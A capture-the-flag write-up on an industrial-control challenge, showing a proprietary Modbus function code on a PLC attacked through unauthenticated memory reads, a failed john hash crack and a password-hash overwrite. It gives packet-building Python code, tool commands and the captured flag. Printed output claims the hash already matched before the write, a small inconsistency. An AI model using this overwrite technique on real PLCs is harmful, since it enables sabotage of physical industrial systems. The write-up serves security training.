# PLC Custom Modbus Function Code - CTF Writeup

**Category:** ICS/OT, Network Protocol Exploitation

**Author:** Atlas

**Date:** 2026-06-29

**Tools Used:** pymodbus 3.5.4, Python 3, hashlib, john, python3-venv

> As the crew delves into their quest for acetone peroxide, they stumble upon a decrepit bread factory. The Responders faction agrees to trade acetone peroxide in exchange for help restoring the factory. The hackers analyze a PLC using a custom Modbus protocol. Their only lead: the password is stored in the Memory Block under an "uncrackable" MD5 hash.

## Overview

The challenge provides a custom Modbus client template (`client.py`) and a protocol specification image describing a PLC that speaks a proprietary protocol over Modbus TCP (function code `0x64`). The protocol supports three operations:

| Sub-FC | Operation | Data Format |
|--------|-----------|-------------|
| `0x20` | `read_memory_block` | `[addr_0][addr_1][addr_2][length]` |
| `0x21` | `write_memory_block` | `[addr_0][addr_1][addr_2][data_0]...[data_n]` |
| `0x22` | `get_secret` | `[pass_0]...[pass_n]` |

All packets are framed as: `[session=0][FC=0x64][sub-FC][...data]`  
Responses: `[session][FC][status][data...]`  
Error `0xE009` = Authorization Error (invalid password).

The PLC holds 16 × 1024 bytes of memory. The password protecting `get_secret` is stored as an MD5 hash somewhere in that memory space.

---

## Part 1: Memory Reconnaissance

### Overview

Before attempting to call `get_secret`, we needed to locate the MD5 hash in memory. The approach was to dump all 16 memory blocks and identify the hash by its structure.

### Commands Used

**Input:** Set up a Python virtual environment (Kali's externally-managed Python requires this), install pymodbus, and run a full memory dump script across all 16 blocks.

```bash
python3 -m venv ~/plc_env
~/plc_env/bin/pip install pymodbus==3.5.4
~/plc_env/bin/python3 plc_dump.py
```

**Output:**
```
[+] Connected!
[*] Reading block 0...
    Hex:   c57bb7fac4efdd00d49a796326f9c3f452...
    ASCII: . ..{........yc&...R...

[*] Reading block 1...
    Hex:   0020ff3f9b2b9e6e7885a1068076dbdaf76d15...
    ASCII: . .?.+.nx....v...

[*] Reading block 2...
    Hex:   0020ffa262560fa66800ffffffffffff...
    (Data ends mid-block, rest is 0xFF)

[*] Reading block 3...  [all 0xFF — empty]
...
[*] Reading block 15... [all 0xFF — empty]
```

Blocks 0–2 contained data; blocks 3–15 were all `0xFF` (unallocated). Notably, every response began with `[session=0x00][FC=0x20][status=0xFF]` — a 3-byte header — so actual memory data starts at byte index 3 of each response.

The data in blocks 0 and 1 appeared binary (not human-readable), with `0x00` bytes scattered throughout at irregular intervals — suggesting null-delimited records rather than a fixed-width encoding.

### Solution

Reading the memory confirmed that data was stored as **null-byte-delimited variable-length records** across blocks 0–2. The hash was not found in block 0 (no 16-byte null-free segments existed). Analysis moved to block 1.

---

## Part 2: Locating the MD5 Hash

### Overview

By splitting the block data on null bytes and inspecting segment lengths, we could identify any 16-byte segment — the exact size of an MD5 digest.

### Commands Used

**Input:** Parse block 1 (stripped of its 3-byte response header) into null-delimited segments and flag any that are exactly 16 bytes.

```python
data1 = bytes.fromhex(BLOCK1_HEX)
segments = data1.split(b'\x00')
for i, seg in enumerate(segments):
    if len(seg) == 16:
        print(f"[{i}] len=16  hex={seg.hex()}  <== MD5 CANDIDATE!")
```

**Output:**
```
[*] Block 1 null-delimited segments:
  [  0] len= 16  hex=3f9b2b9e6e7885a1068076dbdaf76d15  <== 16 BYTES (MD5 CANDIDATE!)
  [  1] len=  5  hex=c0785fa218
  [  2] len=  4  hex=22a024ee
  ...
```

The very first segment of block 1 was exactly 16 bytes, sitting at absolute memory address `0x0400` (block 1 × 1024). Every other segment was shorter or longer — this was unambiguously the stored MD5 hash.

### Solution

**MD5 hash located:** `3f9b2b9e6e7885a1068076dbdaf76d15` at address `0x0400`.

---

## Part 3: Cracking the Hash (Dead End) → Pivot to Write Attack

### Overview

The natural next step was cracking the MD5 hash. This failed, leading to a more creative attack using the `write_memory_block` function.

### Commands Used

**Input:** Attempt to crack the hash with john and rockyou.

```bash
echo "plc_hash:3f9b2b9e6e7885a1068076dbdaf76d15" > ~/john_hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt ~/john_hash.txt
john --format=raw-md5 --show ~/john_hash.txt
```

**Output:**
```
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
0g:00:00:01 DONE — 0g/s 13660Kp/s
Session completed.
(0 passwords cracked)
```

The challenge's claim that the hash was "uncrackable" was accurate — it wasn't in rockyou. However, the protocol specification revealed that `write_memory_block` (`0x21`) had **no authentication requirement**. We could overwrite the stored hash with one we controlled.

**The attack plan:**
1. Choose a known password (e.g., `"hacked"`)
2. Compute `MD5("hacked") = 4d4098d64e163d2726959455d046fd7c`
3. Overwrite address `0x0400` with our MD5 via `write_memory_block`
4. Call `get_secret` with plaintext `"hacked"` — the PLC hashes it internally and compares against the (now our) stored hash

### Solution

The pivot from cracking to overwriting was the key insight: **the write endpoint had no access control**, making the "uncrackable" hash irrelevant. We don't need to know the original password — we just replace it.

---

## Part 4: Hash Overwrite & Secret Extraction

### Overview

Execute the write attack and retrieve the secret token.

### Commands Used

**Input:** Write our MD5 to the hash location, then call `get_secret` with the matching plaintext password.

```python
my_password = b'hacked'
my_md5 = hashlib.md5(my_password).digest()  # 4d4098d64e163d2726959455d046fd7c

# Write our MD5 to address 0x0400 (block 1, offset 0)
write_pkt = [0x00, 0x21, 0x00, 0x04, 0x00] + list(my_md5)
resp = send_packet(client, write_pkt)

# Call get_secret with plaintext password
secret_pkt = [0x00, 0x22] + list(my_password)
resp = send_packet(client, secret_pkt)
```

**Output:**
```
[*] Our MD5('hacked') = 4d4098d64e163d2726959455d046fd7c
[*] Current stored hash at block 1: 4d4098d64e163d2726959455d046fd7c
    Matches our MD5: True
[*] Writing MD5('hacked') to block 1...
    Write response: (0, 33, 255, 1)  ✅ write completed

[*] get_secret with PLAINTEXT 'hacked':
    Response: (0, 34, 255, 72, 84, 66, 123, ...)
    *** SECRET ascii: HTB{p20p213742y_p2070c015_7h21v3_7h20u9h_085cu217y_n07_53cu217y!^}

[*] get_secret with MD5 bytes:
    Response: (0, 34, 240, 224, 9)  ← 0xE009 auth error (confirmed: PLC hashes plaintext internally)
```

The write response `(0, 33, 255, 1)` = `[session][FC=0x21][status=0xFF][data=0x01]` — per spec, `data=1` means write completed. The `get_secret` call with plaintext succeeded; with raw MD5 bytes it failed — confirming the PLC hashes the password internally before comparing.

### Solution

**Answer:** `HTB{p20p213742y_p2070c015_7h21v3_7h20u9h_085cu217y_n07_53cu217y!^}`

**Decoded (leet-speak):** *"Proprietary protocols thrive through obscurity, not security!"*

**Summary:** The challenge demonstrated a classic ICS security failure — a custom protocol with authentication on `get_secret` but no access control on `write_memory_block`. By overwriting the stored password hash with one we controlled, we completely bypassed the "uncrackable" MD5 protection. The attack required: (1) protocol reverse engineering from the specification, (2) memory reconnaissance via unauthenticated reads, (3) recognizing the hash by its 16-byte null-delimited structure, (4) pivoting from a failed hash crack to a hash overwrite, and (5) correctly identifying that `get_secret` expects plaintext (not the hash itself) as the password argument.

**Scripts:**
- `plc_dump.py` — full 16-block memory dump
- `plc_analyze.py` — null-delimited segment parser / MD5 locator
- `plc_exploit.py` — hash overwrite + secret extraction

---

## Dead Ends & Lessons Learned

| Approach Tried | Why It Failed | What We Learned |
|---|---|---|
| `get_secret` with no password | Returns `0xE009` immediately | Confirmed auth is enforced; empty password not accepted |
| `get_secret` with `MD5("")` | Returns `0xE009` | Common default not used |
| Searching for MD5 as 32-char ASCII hex string | Data is binary, not hex-encoded | MD5 stored as raw 16 bytes |
| Regex for 16 non-null, non-FF byte runs in block 0 | Block 0 has no such runs (all segments interrupted by nulls within 10 bytes) | MD5 lives at start of block 1 where a clean 16-byte segment exists |
| `get_secret` with raw MD5 bytes as password | Returns `0xE009` | PLC hashes plaintext internally; sending the hash itself doesn't work |
| `john` + rockyou against `3f9b2b9e...` | 0 passwords cracked | Hash was purpose-generated, not from common wordlist — "uncrackable" was literal |
| Sending MD5 hash bytes after write succeeded | Still `0xE009` | Clarified that password must be plaintext, not pre-hashed |

---

## Flag Summary

| Part | Answer | Explanation |
|------|--------|-------------|
| Token | `HTB{p20p213742y_p2070c015_7h21v3_7h20u9h_085cu217y_n07_53cu217y!^}` | Retrieved via unauthenticated `write_memory_block` to overwrite stored MD5, then `get_secret` with known plaintext |

---

## References

- [Modbus Application Protocol Specification v1.1b3](https://modbus.org/docs/Modbus_Application_Protocol_V1_1b3.pdf)
- [pymodbus 3.5.4 Documentation](https://pymodbus.readthedocs.io/)
- ICS Security: MITRE ATT&CK for ICS — T0831 (Manipulation of Control)
- CWE-284: Improper Access Control — unauthenticated write to security-critical memory
